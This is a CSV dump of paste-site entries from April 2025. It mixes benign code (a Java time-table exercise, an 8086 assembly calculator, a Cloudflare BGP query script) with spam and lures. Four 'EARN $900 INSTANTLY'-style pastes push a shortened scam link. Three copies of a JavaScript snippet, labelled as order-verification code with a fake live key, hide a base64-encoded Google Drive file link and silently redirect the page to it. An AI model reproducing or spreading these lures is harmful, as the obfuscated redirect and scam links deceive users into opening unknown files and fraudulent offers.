id,title,username,language,date,content
v4FG0mzy,EARN $900 INSTANTLY 2025 2U,bgftxc,JavaScript,Tuesday 15th of April 2025 12:54:17 PM CDT," 
Pdf https://tinyurl.com/privguidee


kWYGfAkCVt
"
RJxW7WWv,Untitled,kammex,JavaScript,Tuesday 15th of April 2025 12:45:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DE0gvcSu,[NP] Time Table,dzocesrce,Java,Tuesday 15th of April 2025 12:40:31 PM CDT,"import java.io.InputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.*;

class Time {
    private int hours;
    private  int minutes;
    private String timeOfDay;

    public Time(int hours, int minutes) {
        this.hours = hours;
        this.minutes = minutes;
        this.timeOfDay=""AM"";
    }

    public int getHours() {
        return hours;
    }

    public int getMinutes() {
        return minutes;
    }

    public static Time createTime(String s) throws UnsupportedFormatException, InvalidTimeException {
        int hours,minutes;

        if(s.contains(""."")){
            String[] parts= s.split(""\\."");
            hours= Integer.parseInt(parts[0]);
            minutes= Integer.parseInt(parts[1]);
        }
        else if(s.contains("":"")){
            String[] parts= s.split("":"");
            hours= Integer.parseInt(parts[0]);
            minutes= Integer.parseInt(parts[1]);
        }
        else{
            throw new UnsupportedFormatException(s);
        }
        if(hours>23||hours<0||minutes<0||minutes>59)
            throw new InvalidTimeException(s);

        return new Time(hours,minutes);
    }

    public String getTimeOfDay() {
        return timeOfDay;
    }

    public String changeToFormat24(){
        int new_hours;
        if(hours>12){
            new_hours=hours-12;
            timeOfDay=""PM"";
        }
        else if(hours==12){
            new_hours=12;
            timeOfDay=""PM"";
        }
        else if(hours==0){
            new_hours=hours+12;
        }
        else{
            new_hours=hours;
        }
        return String.format(""%2d:%02d %s"",new_hours,minutes,timeOfDay);


    }


    @Override
    public String toString() {
        return String.format(""%2d:%02d"",hours,minutes);
    }
}
class InvalidTimeException extends Exception{
    public InvalidTimeException(String message) {
        super(message);
    }
}

class UnsupportedFormatException extends Exception{
    public UnsupportedFormatException(String message) {
        super(message);
    }
}

public class TimesTest {

	public static void main(String[] args) {
		TimeTable timeTable = new TimeTable();
		try {
			timeTable.readTimes(System.in);
		} catch (UnsupportedFormatException e) {
			System.out.println(""UnsupportedFormatException: "" + e.getMessage());
		} catch (InvalidTimeException e) {
			System.out.println(""InvalidTimeException: "" + e.getMessage());
		}
		System.out.println(""24 HOUR FORMAT"");
		timeTable.writeTimes(System.out, TimeFormat.FORMAT_24);
		System.out.println(""AM/PM FORMAT"");
		timeTable.writeTimes(System.out, TimeFormat.FORMAT_AMPM);
	}

}

enum TimeFormat {
	FORMAT_24, FORMAT_AMPM
}

class TimeTable {
    private List<Time> times;

    public TimeTable() {
        times= new ArrayList<>();
    }

    public void readTimes(InputStream in) throws InvalidTimeException, UnsupportedFormatException {
        Scanner scanner = new Scanner(in);
        while(scanner.hasNextLine()){
            String line = scanner.nextLine();
            String[] parts = line.split(""\\s+"");
            for(String p : parts){
                Time time= Time.createTime(p);
                times.add(time);
            }
        }


    }

    public void writeTimes(PrintStream out, TimeFormat timeFormat) {
        PrintWriter printWriter = new PrintWriter(out);

        if(timeFormat.equals(TimeFormat.FORMAT_24))
            times.stream().sorted(Comparator.comparing(Time::getHours).thenComparing(Time::getMinutes))
                    .forEach(i-> printWriter.println(i));
        else{
            times.stream().sorted(Comparator.comparing(Time::getHours)
                            .thenComparing(Time::getMinutes))
                    .forEach(i-> printWriter.println(i.changeToFormat24()));
        }

        printWriter.flush();
    }
}"
fBAuxK0G,Make $1000 15-MINUTES (BEGINNER) FM,Payycrab,JavaScript,Tuesday 15th of April 2025 12:40:27 PM CDT," 
Pdf https://tinyurl.com/privguidee


PSdWTJcwPJ
"
21B5jBn4,Untitled,Artychenal,6502 TASM/64TASS,Tuesday 15th of April 2025 12:34:54 PM CDT,".model small
.stack 100h
.data
    title_msg       db ""Piecewise Function Calculator"", 13, 10, '$'
    equation_msg1   db ""Function Z is defined as:"", 13, 10, '$'
    equation_msg2   db ""   x-1               if x < 10"", 13, 10, '$'
    equation_msg3   db ""Z= (3x^2+4)/(x-2)    if x = 10"", 13, 10, '$'
    equation_msg4   db ""   (7x^2-56)/(2x-5)  if x > 10"", 13, 10, '$'
    instruction_msg db 13, 10, ""Press ESC to exit, any other key to continue..."", 13, 10, '$'
    prompt_msg      db 13, 10, 'Enter value of x: $'
    error_msg       db 13, 10, 'Invalid input! Please enter a valid number.$'
    overflow_msg    db 13, 10, 'Overflow occurred during calculation!$'
    div_zero_msg    db 13, 10, 'Error: Division by zero!$'
    result_msg      db 13, 10, 'Result: $'
    remainder_msg   db ' remainder $'
    newline         db 13, 10, '$'
    cont_msg        db 13, 10, 'Press ESC to exit or any key to continue...$'
    
    x               dw ?
    result          dw ?
    remainder       dw ?
    
    buffer          db 6, ?, 6 dup(?)  ; Buffer for input: max length, actual length, characters
    is_negative     db 0               ; Flag for negative input
    
.code
main proc
    mov ax, @data
    mov ds, ax
    
    ; Display title and equation system
    call display_equation_system
    
main_loop:
    ; Display prompt
    mov ah, 09h
    lea dx, prompt_msg
    int 21h
    
    ; Get user input
    call read_number
    
    ; Check for input errors
    cmp ax, 0
    je error_handler
    
    ; Store x value
    mov x, bx
    
    ; Calculate Z based on the value of x
    call calculate_z
    
    ; Display result
    call display_result
    
    ; Check if user wants to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    ; Wait for key press
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_program
    
    ; Clear screen for next calculation
    call clear_screen
    
    ; Display equation system again
    call display_equation_system
    
    ; Continue loop
    jmp main_loop
    
error_handler:
    mov ah, 09h
    lea dx, error_msg
    int 21h
    
    ; Check if user wants to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    ; Wait for key press
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_program
    
    ; Clear screen for next calculation
    call clear_screen
    
    ; Display equation system again
    call display_equation_system
    
    ; Continue loop
    jmp main_loop
    
exit_program:
    ; Exit program
    mov ax, 4C00h
    int 21h
main endp

; Procedure to display equation system and instructions
display_equation_system proc
    mov ah, 09h
    lea dx, title_msg
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg1
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg2
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg3
    int 21h
    
    mov ah, 09h
    lea dx, equation_msg4
    int 21h
    
    mov ah, 09h
    lea dx, instruction_msg
    int 21h
    
    ret
display_equation_system endp

; Procedure to clear screen
clear_screen proc
    mov ax, 0003h  ; AH=0, AL=3 (text mode 80x25)
    int 10h
    ret
clear_screen endp

; Procedure to read a number from user input
read_number proc
    ; Read string
    mov ah, 0Ah
    lea dx, buffer
    int 21h
    
    ; Check if input is empty
    mov al, buffer[1]
    cmp al, 0
    je input_error
    
    ; Initialize registers
    xor bx, bx      ; BX will hold the result
    mov cl, buffer[1]  ; CL = length of input
    mov si, offset buffer + 2  ; SI points to first character
    
    ; Check for negative sign
    mov byte ptr [is_negative], 0
    cmp byte ptr [si], '-'
    jne check_digits
    
    ; Set negative flag and move to next character
    mov byte ptr [is_negative], 1
    inc si
    dec cl
    cmp cl, 0       ; Check if only minus sign was entered
    je input_error
    
check_digits:
    ; Process each digit
    xor ax, ax
    mov al, [si]
    
    ; Check if character is a digit (0-9)
    cmp al, '0'
    jb input_error
    cmp al, '9'
    ja input_error
    
    ; Convert ASCII to numeric value
    sub al, '0'
    
    ; Multiply current result by 10 and add new digit
    mov dx, 10
    mov ax, bx
    mul dx
    jc check_overflow  ; Check for overflow
    
    mov bx, ax
    mov al, [si]
    sub al, '0'
    
    ; Check for potential overflow before adding
    add bx, ax
    jc check_overflow  ; Check for overflow
    
    ; Check for maximum/minimum 16-bit integer values
    cmp byte ptr [is_negative], 1
    je check_negative_limit
    cmp bx, 32767   ; Check max positive value for signed 16-bit
    ja check_overflow
    jmp continue_reading
    
check_negative_limit:
    cmp bx, 32768   ; Check max negative value for signed 16-bit
    ja check_overflow
    
continue_reading:
    ; Move to next character
    inc si
    dec cl
    jnz check_digits
    
    ; Apply negative sign if needed
    cmp byte ptr [is_negative], 1
    jne read_done
    neg bx
    
read_done:
    mov ax, 1       ; Success
    ret
    
check_overflow:
    ; Handle overflow - display error and wait for keypress
    mov ah, 09h
    lea dx, overflow_msg
    int 21h
    
input_error:
    xor ax, ax      ; Error
    ret
read_number endp

; Procedure to calculate Z based on value of x
calculate_z proc
    mov ax, x
    cmp ax, 10      ; Compare x with 10
    jl less_than_10
    je equal_to_10
    jg greater_than_10
    
less_than_10:
    ; Z = x - 1
    mov ax, x
    dec ax
    mov result, ax
    mov remainder, 0
    ret
    
equal_to_10:
    ; Z = (3x² + 4) / (x - 2)
    ; Check for division by zero
    mov ax, x
    sub ax, 2
    cmp ax, 0
    je division_by_zero
    
    ; Calculate 3x²
    mov ax, x
    imul ax          ; AX = x²
    jo overflow_error
    mov bx, 3
    imul bx          ; AX = 3x²
    jo overflow_error
    
    ; Add 4
    add ax, 4
    jo overflow_error
    
    ; Divide by (x - 2)
    mov bx, x
    sub bx, 2
    
    ; Perform division
    cwd              ; Convert word to doubleword (sign extend AX into DX:AX)
    idiv bx          ; AX = quotient, DX = remainder
    
    mov result, ax
    mov remainder, dx
    ret
    
greater_than_10:
    ; Z = (7x² - 56) / (2x - 5)
    ; Check for division by zero
    mov ax, x
    shl ax, 1        ; AX = 2x
    sub ax, 5        ; AX = 2x - 5
    cmp ax, 0
    je division_by_zero
    mov bx, ax       ; Store denominator in BX
    
    ; Calculate 7x²
    mov ax, x
    imul ax          ; AX = x²
    jo overflow_error
    mov cx, 7
    imul cx          ; AX = 7x²
    jo overflow_error
    
    ; Subtract 56
    sub ax, 56
    jo overflow_error
    
    ; Divide by (2x - 5)
    cwd              ; Convert word to doubleword (sign extend AX into DX:AX)
    idiv bx          ; AX = quotient, DX = remainder
    
    mov result, ax
    mov remainder, dx
    ret
    
division_by_zero:
    mov ah, 09h
    lea dx, div_zero_msg
    int 21h
    
    ; Wait for key press to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_div_zero
    
    ; Clear screen and display equation system
    call clear_screen
    call display_equation_system
    
    ; Return to main loop
    jmp main_loop
    
exit_div_zero:
    mov ax, 4C01h    ; Exit with error code
    int 21h
    
overflow_error:
    mov ah, 09h
    lea dx, overflow_msg
    int 21h
    
    ; Wait for key press to continue
    mov ah, 09h
    lea dx, cont_msg
    int 21h
    
    mov ah, 01h
    int 21h
    
    ; If ESC pressed, exit
    cmp al, 27  ; ESC key scan code
    je exit_overflow
    
    ; Clear screen and display equation system
    call clear_screen
    call display_equation_system
    
    ; Return to main loop
    jmp main_loop
    
exit_overflow:
    mov ax, 4C02h    ; Exit with error code
    int 21h
calculate_z endp

; Procedure to display calculation result
display_result proc
    mov ah, 09h
    lea dx, result_msg
    int 21h
    
    ; Display quotient (result)
    mov ax, result
    call display_number
    
    ; Check if there's a remainder to display
    mov ax, remainder
    cmp ax, 0
    je no_remainder
    
    ; Display remainder part
    mov ah, 09h
    lea dx, remainder_msg
    int 21h
    
    mov ax, remainder
    call display_number
    
no_remainder:
    mov ah, 09h
    lea dx, newline
    int 21h
    ret
display_result endp

; Procedure to display a signed number
display_number proc
    ; Check if number is negative
    test ax, ax
    jns positive_number
    
    ; Display minus sign
    push ax
    mov dl, '-'
    mov ah, 02h
    int 21h
    pop ax
    
    ; Convert to positive
    neg ax
    
positive_number:
    ; Convert number to string
    mov bx, 10      ; Divisor
    mov cx, 0       ; Digit counter
    
digit_loop:
    xor dx, dx
    div bx          ; AX / 10: quotient in AX, remainder in DX
    push dx         ; Push digit on stack
    inc cx          ; Increment digit counter
    test ax, ax
    jnz digit_loop  ; Continue if quotient is not zero
    
display_loop:
    pop dx          ; Get digit from stack
    add dl, '0'     ; Convert to ASCII
    mov ah, 02h
    int 21h         ; Display character
    loop display_loop
    
    ret
display_number endp

end main"
UP67FBX9,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 12:30:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18439/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4gUvgSE4,EARN $900 INSTANTLY 2025⭐ G8,Payycrab,JavaScript,Tuesday 15th of April 2025 12:27:02 PM CDT," 
Pdf https://tinyurl.com/privguidee


eoUieKxOIA
"
8u70d0ks,cf.asn.neighbours,rgruber,JavaScript,Tuesday 15th of April 2025 12:21:27 PM CDT,"let asns=(await fetch(""https://radar.cloudflare.com/charts/BgpRoutesAsnsCard/fetch"").then(r=>r.json())).asns;
let rel={};
for (var x of asns) {
    let rels= (await fetch(""https://radar.cloudflare.com/charts/BgpRoutesRelsTable/fetch?location=as""+x.asn).then(r=>r.json())).rels;
    console.log(x.asn,x.name,x.country, rels.upstreams.map(v=>v.asn), rels.peers.map(v=>v.asn),rels.downstreams.map(v=>v.asn));
    x.neighbours=rels.upstreams.length+rels.peers.length+rels.downstreams.length;
    x.ipv6Count=Number(x.ipv6Count);
    rel[x.asn]={};
    rel[x.asn].upstreams=rels.upstreams.map(v=>v.asn);
    rel[x.asn].peers=rels.peers.map(v=>v.asn);
    rel[x.asn].downstreams=rels.downstreams.map(v=>v.asn);
    x.bgpUpstreams=rels.upstreams.length;
    x.bgpPeers=rels.peers.length;
    x.bgpDownstreams=rels.downstreams.length;
}"
sPaYjKDY,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 12:14:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23228/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xcRfkU32,Make $1000 15-MINUTES  (BEGINNER) HV,Payycrab,JavaScript,Tuesday 15th of April 2025 12:13:35 PM CDT," 
Pdf https://tinyurl.com/privguidee


DDEDCyxAfs
"
